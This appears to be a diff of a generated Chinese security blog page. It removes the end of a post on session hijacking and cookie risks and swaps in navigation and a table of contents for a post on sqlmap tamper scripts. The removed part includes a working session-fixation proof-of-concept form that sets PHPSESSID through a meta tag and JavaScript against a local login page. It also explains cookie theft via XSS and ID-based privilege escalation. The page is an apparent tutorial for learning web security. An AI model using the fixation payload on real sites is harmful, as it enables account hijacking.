-}</code></pre><p>此时攻击者构造一个表单页面。通过js来设置cookie造成会话固定攻击。此时使用户登陆。</p>
-<pre><code>&lt;html&gt;  
-  &lt;meta charset=&quot;utf-8&quot;  content=&quot;text/html; charset=gb2312&quot;/&gt;
-    &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
-    &lt;body&gt;
-    &lt;script&gt;history.pushState(&apos;&apos;, &apos;&apos;, &apos;/&apos;)&lt;/script&gt;
-      &lt;form action=&quot;http://127.0.0.1/login.php&quot; method=&quot;POST&quot;&gt;
-      用户名称：&lt;input type=&quot;text&quot; name=&quot;zhanghao&quot;&gt;&lt;br/&gt;&lt;br/&gt;
-      用户密码：&lt;input type=&quot;password&quot; name=&quot;mima&quot;&gt;&lt;br/&gt;&lt;br/&gt;
-        &lt;input type=&quot;hidden&quot; name=&quot;denglu&quot; value=&quot;&amp;#153;&amp;#187;&amp;#189;&amp;#149;&quot; /&gt;
-        &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
-        &lt;meta http-equiv=&apos;Set-Cookie&apos; content=&apos;PHPSESSID=22333&apos;&gt;
-      &lt;/form&gt;
-      &lt;script type=&apos;text/javascript&apos;&gt; document.cookie=&apos;PHPSESSID=123456789&apos; &lt;/script&gt;
-    &lt;/body&gt;
-  &lt;/html&gt;</code></pre><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153058-f52e33ca-3bf3-1.png" alt></p>
-<p>此时抓包可以看到，提交的SESSID是我们构造的，而且服务器端暂时未创建123456789的用户session，然后用户点击提交。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153059-f5c40094-3bf3-1.png" alt>  </p>
-<p>可以看到服务器端成功创建了我们构造的session，然后攻击者便可以通过PHPSESSID=123456789造成合法登陆，由此便造成了一次完整的会话固定劫持，当然如果是url传递将更加方便，直接在url里加入自己的sessionid，用户点击正常的url登陆即可。</p>
-<h1 id="cookie造成的一些安全隐患"><a href="#cookie造成的一些安全隐患" class="headerlink" title="cookie造成的一些安全隐患"></a>cookie造成的一些安全隐患</h1><p>在session身份认证中，一切用户的session都会存储在服务器，但是如果一旦用户量达到一个上限，那么对于服务器的荷载也是巨大的，但是在cookie实现身份认证中，并不会存储在服务器，而是存储在用户的客户端，cookie的出现是一次重大的变革，也是一项非常有争议的技术，原因就是因为他的透明性以及信息量，很容易泄露用户的隐私。</p>
-<p>在session如果不设置过期时间，在服务器上就会一直存在，永远不会注销，在cookie中如果不设置过期时间，则在关闭浏览器时销毁该cookie，session会给服务器造成很大的负载，但是cookie并不存在这个问题，它将信息保存在了每个用户的客户端。淘宝便是使用了cookie存储一部分信息。</p>
-<h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>cookie中存取了大量用户的信息，如身份id，浏览次数，手机号，等一些隐私信息，截取了某平台的cookie信息，存储的信息量非常多，Cookie的主要功能是实现用户个人信息的记录，它最根本的用途是帮助Web站点保存有关访问者的信息，可是一旦泄露除了信息泄露，攻击者无疑也可以通过用户身份登录，无疑也是很大的隐患。</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190301153100-f6790674-3bf3-1.png" alt></p>
-<p>Cookie以纯文本的形式在浏览器和服务器之间传送，大多明文的形式被非法用户截获之后无疑是身份被盗取了，并且身份的信息也被盗取了，通过xss漏洞很容易获得cookie，如果没有做好防护措施，便会使用户的信息泄露。</p>
-<h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><p>在cookie的身份认证中，极容易造成越权，切大多数越权修改参数都是在cookie中修改，大多数cookie中会有用户的userid，如果未合理的处理或者多重认证，很容易造成越权。在某安全公司的一次测试中，正是由于一次id的接口错误的设置，导致数万用户的平行越权，遍历ID，造成信息的泄露。危害可见一斑。</p>
-<p>参考：<a href="https://blog.csdn.net/h_mxc/article/details/50542038" target="_blank" rel="noopener">https://blog.csdn.net/h_mxc/article/details/50542038</a><br>参考：<a href="https://blog.csdn.net/u010084228/article/details/78269345" target="_blank" rel="noopener">https://blog.csdn.net/u010084228/article/details/78269345</a></p>
+<p>此处有两点需要注意：</p>
+<p>1、不需要flush privileges来刷新权限。</p>
+<p>2、密码要包含大写字母，小写字母，数字，特殊符号。</p>
 
       
     </div>
@@ -461,7 +418,7 @@ if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
       
         <div class="post-tags">
           
-            <a href="/tags/web漏洞/" rel="tag"># web漏洞</a>
+            <a href="/tags/杂/" rel="tag"># 杂</a>
           
         </div>
       
@@ -474,8 +431,8 @@ if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/12/25/php协议漏洞/" rel="next" title="php的协议漏洞">
-                <i class="fa fa-chevron-left"></i> php的协议漏洞
+              <a href="/2019/06/25/csp内容安全策略/" rel="next" title="csp内容安全策略">
+                <i class="fa fa-chevron-left"></i> csp内容安全策略
               </a>
             
           </div>
@@ -484,8 +441,8 @@ if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2019/03/03/哈希长度拓展攻击/" rel="prev" title="哈希长度拓展攻击">
-                哈希长度拓展攻击 <i class="fa fa-chevron-right"></i>
+              <a href="/2019/09/21/misc-ctf/" rel="prev" title="misc-ctf">
+                misc-ctf <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -616,7 +573,7 @@ if ($_SESSION[&apos;name&apos;] == &quot;&quot;)
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#为什么需要会话"><span class="nav-number">2.</span> <span class="nav-text">为什么需要会话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php中的session"><span class="nav-number">3.</span> <span class="nav-text">php中的session</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#session劫持"><span class="nav-number">4.</span> <span class="nav-text">session劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#规则爆破"><span class="nav-number">4.1.</span> <span class="nav-text">规则爆破</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用XSS或者文件读取"><span class="nav-number">4.2.</span> <span class="nav-text">利用XSS或者文件读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#会话固定劫持"><span class="nav-number">4.3.</span> <span class="nav-text">会话固定劫持</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#cookie造成的一些安全隐患"><span class="nav-number">5.</span> <span class="nav-text">cookie造成的一些安全隐患</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#信息泄露"><span class="nav-number">5.1.</span> <span class="nav-text">信息泄露</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#越权"><span class="nav-number">5.2.</span> <span class="nav-text">越权</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#自带tamper及用法"><span class="nav-number">1.</span> <span class="nav-text">自带tamper及用法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#apostrophemask-py"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">apostrophemask.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#base64encode-py"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">base64encode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#multiplespaces-py"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">multiplespaces.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2plus-py"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">space2plus.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nonrecursivereplacement-py"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">nonrecursivereplacement.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2randomblank-py"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">space2randomblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unionalltounion-py"><span class="nav-number">1.0.0.7.</span> <span class="nav-text">unionalltounion.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#securesphere-py"><span class="nav-number">1.0.0.8.</span> <span class="nav-text">securesphere.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2dash-py"><span class="nav-number">1.0.0.9.</span> <span class="nav-text">space2dash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mssqlblank-py"><span class="nav-number">1.0.0.10.</span> <span class="nav-text">space2mssqlblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#between-py"><span class="nav-number">1.0.0.11.</span> <span class="nav-text">between.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#percentage-py"><span class="nav-number">1.0.0.12.</span> <span class="nav-text">percentage.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sp-password-py"><span class="nav-number">1.0.0.13.</span> <span class="nav-text">sp_password.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charencode-py"><span class="nav-number">1.0.0.14.</span> <span class="nav-text">charencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcase-py"><span class="nav-number">1.0.0.15.</span> <span class="nav-text">randomcase.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#charunicodeencode-py"><span class="nav-number">1.0.0.16.</span> <span class="nav-text">charunicodeencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2comment-py"><span class="nav-number">1.0.0.17.</span> <span class="nav-text">space2comment.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#equaltolike-py"><span class="nav-number">1.0.0.18.</span> <span class="nav-text">equaltolike.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#equaltolike-py-1"><span class="nav-number">1.0.0.19.</span> <span class="nav-text">equaltolike.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ifnull2ifisnull-py"><span class="nav-number">1.0.0.20.</span> <span class="nav-text">ifnull2ifisnull.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityversioned-py"><span class="nav-number">1.0.0.21.</span> <span class="nav-text">modsecurityversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqlblank-py"><span class="nav-number">1.0.0.22.</span> <span class="nav-text">space2mysqlblank.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#modsecurityzeroversioned-py"><span class="nav-number">1.0.0.23.</span> <span class="nav-text">modsecurityzeroversioned.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2mysqldash-py"><span class="nav-number">1.0.0.24.</span> <span class="nav-text">space2mysqldash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bluecoat-py"><span class="nav-number">1.0.0.25.</span> <span class="nav-text">bluecoat.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#versionedkeywords-py"><span class="nav-number">1.0.0.26.</span> <span class="nav-text">versionedkeywords.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#halfversionedmorekeywords-py"><span class="nav-number">1.0.0.27.</span> <span class="nav-text">halfversionedmorekeywords.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#space2morehash-py"><span class="nav-number">1.0.0.28.</span> <span class="nav-text">space2morehash.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#apostrophenullencode-py"><span class="nav-number">1.0.0.29.</span> <span class="nav-text">apostrophenullencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#appendnullbyte-py"><span class="nav-number">1.0.0.30.</span> <span class="nav-text">appendnullbyte.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#chardoubleencode-py"><span class="nav-number">1.0.0.31.</span> <span class="nav-text">chardoubleencode.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unmagicquotes-py"><span class="nav-number">1.0.0.32.</span> <span class="nav-text">unmagicquotes.py</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#randomcomments-py"><span class="nav-number">1.0.0.33.</span> <span class="nav-text">randomcomments.py</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#编写tamper"><span class="nav-number">2.</span> <span class="nav-text">编写tamper</span></a></li></div>
             
 
           </div>
